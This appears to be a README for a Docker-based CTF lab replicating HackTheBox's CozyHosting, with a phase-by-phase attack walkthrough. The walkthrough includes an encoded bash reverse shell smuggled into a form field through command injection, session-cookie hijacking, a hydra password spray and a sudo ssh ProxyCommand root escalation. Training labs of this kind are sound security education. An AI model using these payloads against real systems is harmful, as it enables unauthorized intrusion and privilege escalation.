# CozyHosting - HackTheBox CTF Lab Replica

A fully self-contained Docker-based CTF lab that replicates the **CozyHosting** machine from HackTheBox. This lab covers enumeration, broken access control, command injection, post-exploitation credential harvesting, password cracking, and privilege escalation.

## Quick Start

```bash
# 1. Make scripts executable
chmod +x start.sh stop.sh

# 2. (Optional) Stop local SSH to free port 22
sudo systemctl stop ssh

# 3. Start the lab
./start.sh

# 4. (Optional) Add hostname
echo "10.10.10.5 cozyhosting.htb" | sudo tee -a /etc/hosts
```

**Target IP:** `10.10.10.5` — The lab machine is accessible at this IP just like a real HTB box.
You can also reach it via `localhost` (ports 22 and 80 are mapped to the host).

## Architecture

| Service      | Port | Description                        |
|--------------|------|------------------------------------||
| Nginx        | 80   | Reverse proxy → Spring Boot app    |
| SSH          | 22   | OpenSSH (Ubuntu)                   |
| PostgreSQL   | 5432 | Internal only (from reverse shell) |
| Spring Boot  | 8080 | Internal (real Java Spring Boot)   |

**Network:** Container runs on `10.10.10.5` (custom Docker subnet `10.10.10.0/24`).

Everything runs in a single Docker container for simplicity.

---

## Attack Path Walkthrough

### Phase 1: Enumeration

```bash
nmap -sV -sC <TARGET_IP>
```

**Expected results:**
- 22/tcp open ssh OpenSSH (Ubuntu)
- 80/tcp open http nginx (Ubuntu)

Browse to `http://<TARGET_IP>` → landing page with Home, Services, Pricing, Login.

### Phase 2: Discovery

- Poke around the website → discover **Whitelabel Error Page** (Spring Boot indicator)
- Google "whitelabel error page" → Spring Boot uses Actuator endpoints
- Use gobuster or manually check `/actuator/sessions`

```bash
gobuster dir -u http://<TARGET_IP>/actuator/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Phase 3: Broken Access Control (A01:2021)

1. Visit `/actuator/sessions` → reveals `kanderson`'s session cookie
2. Open Burp Suite → intercept request to `/admin`
3. Replace `JSESSIONID` cookie with kanderson's session ID
4. Forward request → logged in as admin

### Phase 4: Command Injection (A03:2021)

1. At the bottom of admin dashboard → **Automatic Patching** form (hostname + username)
2. Test for command injection:
   - Input `;{sleep,10};` as username → response delayed ~10 seconds ✓
3. Craft reverse shell payload:

```bash
echo "bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1" | base64
```

4. Start listener:
```bash
ncat -lvnp 4444
```

5. In Burp Suite Repeater, POST to `/executessh` with:
```
host=<any>&username=;echo${IFS}"<BASE64_PAYLOAD>"|base64${IFS}-d|bash;
```

6. Catch the reverse shell!

### Phase 5: Post-Exploitation

```bash
# Find the JAR file
ls /app/
# → cloudhosting-0.0.1.jar

# Transfer to attack host (from reverse shell)
python3 -m http.server 9999
# On attack host: wget http://<TARGET>:9999/app/cloudhosting-0.0.1.jar

# Extract with 7z
7z x cloudhosting-0.0.1.jar
cat BOOT-INF/classes/application.properties
# → spring.datasource.password=Vg&nvzAQ7XxR
```

### Phase 6: Database Enumeration

```bash
# From the reverse shell
psql -h localhost -U postgres -d cozyhosting -c 'SELECT * FROM users'
# Password: Vg&nvzAQ7XxR
```

Save hashes to file and crack:
```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
# → manchesterunited
```

### Phase 7: Lateral Movement

```bash
# Enumerate users from /etc/passwd
cat /etc/passwd | grep bash
# → root, app, postgres, josh

# Password spray with hydra
hydra -L users.txt -p manchesterunited ssh://<TARGET_IP>
# → josh:manchesterunited

# SSH in
ssh josh@<TARGET_IP>
```

### Phase 8: Privilege Escalation

```bash
sudo -l
# → (root) /usr/bin/ssh *

# GTFOBins SSH escalation
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# Enter josh's password when prompted

# Now root!
cat /root/root.txt
```

---

## Stopping the Lab

```bash
./stop.sh
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Port 22 in use | `sudo systemctl stop ssh` |
| Port 80 in use | `sudo systemctl stop nginx` or `sudo systemctl stop apache2` |
| Container won't start | `docker logs cozyhosting` |
| Can't connect to PostgreSQL | Use password `Vg&nvzAQ7XxR` from the reverse shell |

## Vulnerabilities Covered

1. **A01:2021 Broken Access Control** - Exposed actuator/sessions endpoint
2. **A03:2021 Injection** - OS command injection in SSH execution
3. **Sensitive Data Exposure** - Credentials in application.properties
4. **Password Reuse** - Database password reused for SSH
5. **Privilege Escalation** - Misconfigured sudo permissions (ssh GTFOBins)
